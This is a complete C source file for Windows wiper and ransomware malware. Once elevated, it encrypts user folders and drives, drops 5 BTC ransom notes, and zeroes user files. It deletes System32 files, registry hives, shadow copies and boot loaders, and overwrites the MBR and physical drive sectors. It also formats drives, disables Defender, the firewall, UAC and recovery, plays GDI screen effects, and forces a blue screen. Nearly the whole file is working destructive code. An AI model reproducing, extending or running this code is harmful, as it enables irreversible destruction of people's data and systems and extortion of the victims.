#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include <shlobj.h>
#include <math.h>
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "gdi32.lib")

// Function prototypes for undocumented Windows APIs
typedef NTSTATUS (NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOption, PULONG Response);
typedef NTSTATUS (NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

// GDI effects
void RadialBlurEffect() {
    DWORD startTime = GetTickCount();
    HDC hdc = GetDC(NULL);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    while(GetTickCount() - startTime < 15000) {
        int radius = (GetTickCount() - startTime) / 50;
        for(int angle = 0; angle < 360; angle += 10) {
            double radian = angle * 3.14159 / 180;
            int x = screenWidth/2 + radius * cos(radian);
            int y = screenHeight/2 + radius * sin(radian);

            BitBlt(hdc, x, y, 100, 100, hdc, screenWidth/2, screenHeight/2, SRCCOPY);
            Sleep(10);
        }
    }
    ReleaseDC(NULL, hdc);
}

void ColorChaosEffect() {
    DWORD startTime = GetTickCount();
    HDC hdc = GetDC(NULL);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    while(GetTickCount() - startTime < 15000) {
        HBRUSH brush = CreateSolidBrush(RGB(rand()%255, rand()%255, rand()%255));
        SelectObject(hdc, brush);
        PatBlt(hdc, rand()%screenWidth, rand()%screenHeight,
               rand()%400, rand()%400, PATINVERT);
        DeleteObject(brush);
        Sleep(50);
    }
    ReleaseDC(NULL, hdc);
}

void MeltingEffect() {
    DWORD startTime = GetTickCount();
    HDC hdc = GetDC(NULL);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    for(int y = 0; y < screenHeight && GetTickCount() - startTime < 15000; y += 2) {
        for(int x = 0; x < screenWidth; x += 2) {
            BitBlt(hdc, x, y+5, 2, screenHeight-y,
                   hdc, x, y, SRCCOPY);
        }
        Sleep(10);
    }
    ReleaseDC(NULL, hdc);
}

void DissolveEffect() {
    DWORD startTime = GetTickCount();
    HDC hdc = GetDC(NULL);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    while(GetTickCount() - startTime < 15000) {
        int x = rand() % screenWidth;
        int y = rand() % screenHeight;
        PatBlt(hdc, x, y, 10, 10, BLACKNESS);
        Sleep(1);
    }
    ReleaseDC(NULL, hdc);
}

// Disable close button on console window
void DisableCloseButton() {
    HWND hwnd = GetConsoleWindow();
    HMENU hmenu = GetSystemMenu(hwnd, FALSE);
    EnableMenuItem(hmenu, SC_CLOSE, MF_GRAYED);
}

int IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if (hToken) {
        CloseHandle(hToken);
    }
    return fRet;
}

void RequestAdminPrivileges() {
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);

    ShellExecute(NULL, "runas", path, NULL, NULL, SW_HIDE);
    exit(0);
}

void CreateMassUsers() {
    // do nothing as it only spams >:(
}

void DisableDefenses() {
    // Disable Windows Defender
    system("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f");
    // Disable firewall
    system("netsh advfirewall set allprofiles state off");
    // Disable UAC
    system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f");
    // Disable Windows Update
    system("sc stop wuauserv");
    system("sc config wuauserv start=disabled");
    // Disable Task Manager
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f");
    // Disable Registry Tools
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f");
    // Disable System Restore
    system("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v DisableSR /t REG_DWORD /d 1 /f");
    // Disable Recovery Console
    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Setup\\RecoveryConsole\" /v SecurityLevel /t REG_DWORD /d 0 /f");
    // Disable Safe Mode
    system("bcdedit /set {default} recoveryenabled No");
    system("bcdedit /set {default} bootstatuspolicy ignoreallfailures");
}

void DeleteSystemFiles() {
    // Delete critical system files
    system("del /F /Q C:\\Windows\\System32\\*.dll");
    system("del /F /Q C:\\Windows\\System32\\drivers\\*.sys");
    system("del /F /Q C:\\Windows\\System32\\*.exe");
    system("del /F /Q C:\\Windows\\explorer.exe");
    system("del /F /Q C:\\Windows\\regedit.exe");
    system("del /F /Q C:\\Windows\\System32\\config\\*.*");  // Delete registry hives
    // Delete recovery and backup files
    system("del /F /Q /S C:\\Recovery\\*.*");
    system("del /F /Q C:\\Windows\\System32\\restore\\*.*");
    system("del /F /Q C:\\Windows\\repair\\*.*");
    // Delete system restore points
    system("vssadmin delete shadows /all /quiet");
}

void EncryptFiles() {
    char command[256];
    const char* paths[] = {"Desktop", "Documents", "Pictures", "Downloads", "Music", "Videos", "AppData", "Favorites"};
    char userProfile[MAX_PATH];
    GetEnvironmentVariable("USERPROFILE", userProfile, MAX_PATH);

    // Encrypt more file types and directories
    for(int i = 0; i < 8; i++) {
        sprintf(command, "cipher /E /A /S:%s\\%s", userProfile, paths[i]);
        system(command);
        sprintf(command, "echo YOUR FILES HAVE BEEN ENCRYPTED! Send 5 BTC to unlock. Your personal files, photos, and memories are gone forever unless you pay. > %s\\%s\\RANSOM_NOTE.txt",
            userProfile, paths[i]);
        system(command);
    }

    // Encrypt system drives
    system("cipher /E /A /S:C:\\");
    system("cipher /E /A /S:D:\\");
}

void CorruptStartup() {
    // Corrupt startup files and boot configuration
    system("del /F /Q C:\\Windows\\System32\\winload.exe");  // Corrupt Windows boot loader
    system("del /F /Q C:\\bootmgr");  // Delete boot manager
    system("bcdedit /delete {bootmgr} /f");  // Delete boot manager configuration
    system("bcdedit /delete {default} /f");  // Delete default boot entry
    // Corrupt UEFI bootloader
    system("mountvol X: /s");
    system("del /F /Q X:\\EFI\\Microsoft\\Boot\\*.*");
    system("mountvol X: /d");
}

void DestroyPartitions() {
    HANDLE hDevice;
    char physicalDrive[50];
    BYTE nullBuffer[512] = {0};
    DWORD bytesWritten;

    // Try to wipe first sector of all physical drives and overwrite with random data
    for(int i = 0; i < 16; i++) {
        sprintf(physicalDrive, "\\\\.\\PhysicalDrive%d", i);
        hDevice = CreateFile(physicalDrive, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_EXISTING, 0, NULL);
        if(hDevice != INVALID_HANDLE_VALUE) {
            for(int j = 0; j < 512; j++) {
                nullBuffer[j] = rand() % 256;  // Fill with random garbage
            }
            WriteFile(hDevice, nullBuffer, 512, &bytesWritten, NULL);
            CloseHandle(hDevice);
        }
    }

    // Attempt to format all drives
    system("format C: /fs:raw /q /y");
    system("format D: /fs:raw /q /y");
    system("format E: /fs:raw /q /y");
}

void OverwriteFiles() {
    // Overwrite user files with garbage before deletion
    char command[512];
    const char* paths[] = {"Desktop", "Documents", "Pictures", "Downloads", "Music", "Videos"};
    char userProfile[MAX_PATH];
    GetEnvironmentVariable("USERPROFILE", userProfile, MAX_PATH);

    for(int i = 0; i < 6; i++) {
        sprintf(command, "for /r \"%s\\%s\" %%x in (*) do fsutil file setZeroData offset=0 length=999999999 \"%%x\"",
            userProfile, paths[i]);
        system(command);
    }
}

int main() {
    // Disable close button
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    if (!IsElevated()) {
        RequestAdminPrivileges();
        return 0;
    }

    HANDLE threads[3];

    // Create threads with suspended flag
    threads[0] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)EncryptFiles, NULL, CREATE_SUSPENDED, NULL);
    threads[1] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)OverwriteFiles, NULL, CREATE_SUSPENDED, NULL);
    threads[2] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DeleteSystemFiles, NULL, CREATE_SUSPENDED, NULL);

    // Resume threads
    for(int i = 0; i < 3; i++) {
        ResumeThread(threads[i]);
    }

    // Corrupt startup silently
    CorruptStartup();

    // Destroy partitions silently
    DestroyPartitions();

    // Delete BCD entry
    system("bcdedit /delete {current} /f");

    // Corrupt and overwrite MBR
    HANDLE hDrive = CreateFile("\\\\.\\PhysicalDrive0",
        GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (hDrive != INVALID_HANDLE_VALUE) {
        BYTE buffer[512];
        DWORD bytesWritten;

        // Fill MBR with random garbage
        for(int i = 0; i < 512; i++) {
            buffer[i] = rand() % 256;
        }

        WriteFile(hDrive, buffer, 512, &bytesWritten, NULL);
        CloseHandle(hDrive);
    }

    // Disable security measures
    DisableDefenses();

    // Show GDI effects before destruction
    RadialBlurEffect();
    ColorChaosEffect();
    MeltingEffect();
    DissolveEffect();

    // Force BSOD
    BOOLEAN bEnabled;
    ULONG uResp;
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");

    RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &uResp);

    return 0;
}
